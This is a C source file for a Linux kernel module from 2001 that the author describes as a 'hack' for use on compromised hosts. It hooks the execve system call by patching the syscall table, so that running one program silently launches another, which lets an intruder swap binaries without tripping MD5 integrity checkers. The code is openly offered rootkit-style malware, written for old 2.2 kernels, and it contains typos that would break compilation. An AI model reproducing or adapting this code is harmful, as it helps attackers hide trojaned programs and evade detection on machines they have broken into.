/*
 * TILE: Exec Redirect v1.0 <24/7/2001>
 *
 * CODER: Ripe - <ripe@7a69ezine.org>
 *
 * DESCR: Sometimes we want to modify some binary file in a hacked host, but
 *        it's too dangerous because MD5 checkers can   us. So we must to
 *        searsh a metod to redirect executions using the kernel. We can
 *        do it using sys_execve syscall very bad :)
 *
 *        In this LKM i've not created the metod to comunicate with kernel,
 *        but im sure that you can code it... DoItYourSelf.
 *
 * RECOM: Learn how to coe LKMs.... You'll be better :)
 *
 * TESTED: This LKM have been tested without problems on:
 *           - Linux kernel 2.2.18pre10 (Debian 2.2)
 *           - Linux kernel 2.2.19 (Debian 2.2)
 *
 */

#define __KERNEL__
#define MODULE

#include <linux/ctype.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/version.h>

#include <linux/proc_fs.h>
#include <linux/dirent.h>

#include <sys/syscall.h>

#define _7A69SOFT_
#define CODER       "Ripe"
#define DEBUGMODE

#define __NR_mexecve  222

extern void *sys_call_table[];

typedef struct {
  char *o_exec;
  char *my_exec;
  struct lexec *next;
} lexec;

lexec *e_list;

int (*o_execve)(const char *filename, char *const argv [], char *const envp[]);
int (*o_brk)(void *end_data_segment);
void *tmp;

lexec *is_exec(char *o_exec, char *my_exec);

void my_bzero(char *buf, int size) {
  memset(buf, 0, size);
}
void add_exec(char *o_exec, char *my_exec) {
  lexec *ptr=e_list;
#ifdef DEBUGMODE
  printk("(ER) Adding %s -> %s to redirect list\n", o_exec, my_exec);
#endif
  if ((lexec *)is_exec(o_exec,my_exec)) return;
  if (ptr) {
    while (ptr->next) {
      if (!strcmp(ptr->o_exec, o_exec) && !strcmp(ptr->my_exec, my_exec)) return;
      ptr=(lexec *)ptr->next;
    }
    ptr->next=(struct lexec *)kmalloc(sizeof(lexec), GFP_KERNEL);
    ptr=(lexec *)ptr->next;
    ptr->o_exec=(char *)kmalloc(strlen(o_exec)+1, GFP_KERNEL);
    ptr->my_exec=(char *)kmalloc(strlen(my_exec)+1, GFP_KERNEL);
    strcpy(ptr->o_exec, o_exec);
    strcpy(ptr->my_exec, my_exec);
    ptr->next=NULL;
  } else {
    e_list=(lexec *)kmalloc(sizeof(lexec), GFP_KERNEL);
    ptr=e_list;
    ptr->o_exec=(char *)kmalloc(strlen(o_exec)+1, GFP_KERNEL);
    ptr->my_exec=(char *)kmalloc(strlen(my_exec)+1, GFP_KERNEL);
    strcpy(ptr->o_exec, o_exec);
    strcpy(ptr->my_exec, my_exec);
    ptr->next=NULL;
  }
  return;
}

void del_exec(char *o_exec, char *my_exec) {
  lexec *ptr=e_list, *ptr2;
#ifdef DEBUGMODE
  printk("(ER) Deleting %s -> %s from redirect list\n", o_exec, my_exec);
#endif
  if (!ptr) return;
  if (!strcmp(ptr->o_exec, o_exec) && !strcmp(ptr->my_exec, my_exec)) {
    e_list=(lexec *)ptr->next;
    kfree(ptr->o_exec);
    kfree(ptr->my_exec);
    kfree(ptr);
    return;
  }
  while(ptr) {
    if (!strcmp(ptr->o_exec, o_exec) && !strcmp(ptr->my_exec, my_exec)) break;
    ptr2=ptr;
    ptr=(lexec *)ptr->next;
  }
  if (ptr) {
    ptr2->next=ptr->next;
    kfree(ptr->o_exec);
    kfree(ptr->my_exec);
    kfree(ptr);
  }
  return;
}

lexec *is_exec(char *o_exec, char *my_exec) {
  lexec *ptr=e_list;
  while(ptr) {
    if (my_exec) {
      if (!strcmp(ptr->o_exec, o_exec) && !strcmp(ptr->my_exec, my_exec)) return(ptr);
    } else {
      if (!strcmp(ptr->o_exec, o_exec)) return(ptr);
    }
    ptr=(lexec *)ptr->next;
  }
  return(NULL);
}

int umem_strlen(char *uptr) {
  char ch=255;
  char *ptr;
  int len;
  for (ptr=uptr, len=0 ; ch!=0 ; __generic_copy_from_user(&ch, ptr, 1), len++, ptr++);
  return(len-1);
}

int mexecve(const char *filename, char **argv, char **envp)
{
  long __res;
  __asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_mexecve), "b"((long) (filename)), "c"((long) (argv)), "d"((long) (envp)));
  return (int) __res;
}

int my_execve(const char *filename, char *const argv [], char *const envp []) {
  char *exec;
  int ret;
  lexec *redir;
  unsigned long tmp;
  exec=(char *)kmalloc(umem_strlen((char *)filename)+1, GFP_KERNEL);
  memset(exec, 0, umem_strlen((char *)filename)+1);
  __generic_copy_from_user(exec, filename, umem_strlen((char *)filename));
  if (redir=is_exec(exec, NULL)) {
    kfree(exec);
    tmp=current->mm->brk;
    (*o_brk)((void *)current->mm->brk+umeme_strlen((char *)filename)+1);
    __generic_copy_to_user(tmp, redir->my_exec);
    ret=mexecve((char *)tmp, (char **)argv, (char **)envp);
    (*o_brk)((void *)tmp);
    return(ret);
  }
  kfree(exec);
  return(mexecve(filename, (char **)argv, (char **)envp));
}

int init_module() {
  o_brk=sys_call_table[__NR_brk];
  o_execve=sys_call_table[__NR_execve];
  tmp=sys_call_table[__NR_mexecve]; 
  sys_call_table[__NR_mexecve]=o_execve; 
  sys_call_table[__NR_execve]=my_execve;
  sys_call_table[__NR_mexecve]=o_execve;
#ifdef DEBUGMODE
  printk("(ER) Exec Redirect by Ripe - <ripe@7a69ezine.org>\n");
  printk("(ER) Loaded!\n");
#endif
  add_exec("/bin/ls", "/bin/cat"); /* add the metod :) */
  return(0);
}

void cleanup_module() {
  sys_call_table[__NR_execve]=o_execve;
  sys_call_table[__NR_mexecve]=tmp;
#ifdef DEBUGMODE
  printk("(ER) Exec Redirect by Ripe - <ripe@7a69ezine.org>\n");
  printk("(ER) UnLoaded!\n");
#endif
}

MODULE_AUTHOR("Ripe - <ripe@7a69ezine.org>");
MODULE_DESCRIPTION("hack: exec redirect");
